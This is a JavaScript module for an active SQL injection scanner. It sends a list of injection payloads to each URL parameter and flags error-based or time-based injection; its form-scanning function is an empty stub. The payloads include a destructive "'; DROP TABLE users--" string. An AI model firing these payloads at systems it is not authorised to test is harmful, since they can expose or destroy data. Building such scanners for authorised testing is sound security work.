const axios = require('axios');

module.exports = {
    name: 'SQL Injection Scanner',
    type: 'sqli',
    severity: 'Critical',
    mode: 'active',
    
    payloads: [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--"
    ],
    
    async scan(endpoint, mode) {
        const findings = [];
        
        for (const payload of this.payloads) {
            for (const [param, value] of Object.entries(endpoint.parameters || {})) {
                const testUrl = endpoint.url.replace(param + '=' + value, param + '=' + encodeURIComponent(payload));
                
                try {
                    const startTime = Date.now();
                    const response = await axios.get(testUrl, {
                        timeout: 10000,
                        validateStatus: () => true
                    });
                    const responseTime = Date.now() - startTime;
                    
                    // Check for SQL errors
                    const sqlErrors = [
                        'sql syntax',
                        'mysql_fetch',
                        'ora-',
                        'sql server',
                        'postgresql error',
                        'unclosed quotation mark'
                    ];
                    
                    const hasError = sqlErrors.some(error => 
                        response.data.toLowerCase().includes(error.toLowerCase())
                    );
                    
                    // Check for time-based injection
                    if (payload.includes('SLEEP') && responseTime > 5000) {
                        findings.push({
                            found: true,
                            type: 'SQL Injection',
                            severity: 'Critical',
                            details: `Time-based injection detected in parameter: ${param}`,
                            payload: payload,
                            evidence: `Response time: ${responseTime}ms`,
                            easyToExploit: true,
                            highImpact: true
                        });
                    } else if (hasError) {
                        findings.push({
                            found: true,
                            type: 'SQL Injection',
                            severity: 'Critical',
                            details: `Error-based injection detected in parameter: ${param}`,
                            payload: payload,
                            evidence: 'SQL error messages found in response',
                            easyToExploit: true,
                            highImpact: true
                        });
                    }
                } catch (error) {
                    // Timeout might indicate successful time-based injection
                    if (error.code === 'ECONNABORTED' && payload.includes('SLEEP')) {
                        findings.push({
                            found: true,
                            type: 'SQL Injection',
                            severity: 'Critical',
                            details: `Time-based injection detected (timeout) in parameter: ${param}`,
                            payload: payload,
                            evidence: 'Request timed out indicating delay',
                            easyToExploit: true,
                            highImpact: true
                        });
                    }
                }
            }
        }
        
        return findings[0] || { found: false };
    },
    
    async scanForm(form, mode) {
        // Similar logic for form submissions
        return { found: false };
    }
};
